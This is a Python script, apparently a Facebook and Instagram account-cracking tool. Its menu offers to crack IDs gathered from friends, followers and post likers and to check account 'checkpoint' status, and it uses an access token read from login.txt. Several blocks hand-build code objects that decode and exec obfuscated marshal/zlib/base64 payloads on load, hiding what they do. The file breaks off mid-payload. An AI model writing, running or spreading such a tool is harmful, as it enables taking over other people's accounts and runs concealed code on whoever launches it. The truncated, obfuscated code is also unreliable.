#!/usr/bin/python3
#-*-coding:utf-8-*-
#
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxdkj1vFDEQhtf7vZu7fByBC1BQp7lrIpQCIYREi5CSajrf2tEtsteX8Voh/BpS5i9NS0WNaKiwHU7hsOV5Xr+2Z2TL35P/WurHOz9+/vJBJIKpBB7IgEWmkEZmkEXmkEcWUESWUO74FVQ757f5aqgjG2h2zm3zbuu00EbuwSRyCtPIfdj3TFWpD+CAhZyZOtRHcBR1rmb6CRxHXag9/RSeRV2quT6Bk6grr+cwZ4mcf3t+l8ALwS6S5r7+ER7i4ymjCvkg+mH0srh2ZpReTN9L7sb+yqkL4zbemF2uUXLxyRj14Yvs3GjQu7ngcXsdOPZanr6k1FjK7K2lFCXlwaQa5bWTdrRUd1zJQXCkMlQ1mhotuzUf+q+SWutWGzSdtJZy53pB5Ypb+fqMZp0ZOocoh3Fx5UaH0lL76FH+2ZqBmn7DhfBrFnN/N5o4VKpfLTYcrcQiWNnKnmEZVPngYhUm7ePtsPEG1nHzYG6o+lvjPsFXYSWE38dLKzqOYim6Xi8vfcXF5pbqN9oIp+RbFr7WoQ/nbM0m//Q/3Nqzag==', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
	os.system("clear")
	print("""\033[1;91m
 ____                     _
|  _ \ _ __ ___ _ __ ___ \x1b[0;33m(_)_   _ _ __ ____
| |_) | '__/ _ \ '_ ` _ \| | | | | '_ ` _  |
\x1b[0;32m| __/ | |\x1b[0;36m |  __/ | | | | | | |_| | | | | | |
|_|   |_|  \___\033[1;91m|_| |_| |_|_|\__,_|_| |_| |_|\n""")

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((R+"["+p+"•"+R+"]"+R+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[×]\x1b[0;37m Developer : Muhammad Dicky Wahyudi         \033[1;91m[×]")
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[×]"+p+" Hello     : [ "+a["name"]+p+" ]")
    print("\033[1;91m[×]\x1b[0;37m Your ID   : "+id)
    print("\033[1;91m[×]\x1b[0;37m Your IP   : "+ip)
    print("\033[1;91m[×]\x1b[0;37m Status    : \033[1;91mFree User")
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m1\033[1;91m]\x1b[0;37m Crack ID From Public/Friend \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m2\033[1;91m]\x1b[0;37m Crack ID From Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m3\033[1;91m]\x1b[0;37m Crack ID From Like Post \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m4\033[1;91m]\x1b[0;37m Get ID Public \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m5\033[1;91m]\x1b[0;37m Get ID Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m6\033[1;91m]\x1b[0;37m Result Crack")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m7\033[1;91m]\x1b[0;37m Cek Opsi Akun "+p+"["+R+"CHECKPOINT"+p+"] \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m8\033[1;91m]\x1b[0;37m Setting User Agent")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m9\033[1;91m]\x1b[0;37m Lapor Bug")
    print("\033[1;91m[\x1b[0;37m1\x1b[0;37m0\033[1;91m]\x1b[0;37m Crack instagram \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m0\033[1;91m]\x1b[0;37m Logout")
    print("\033[1;91m[×]--------------------------------------------[×]")
    choose_menu()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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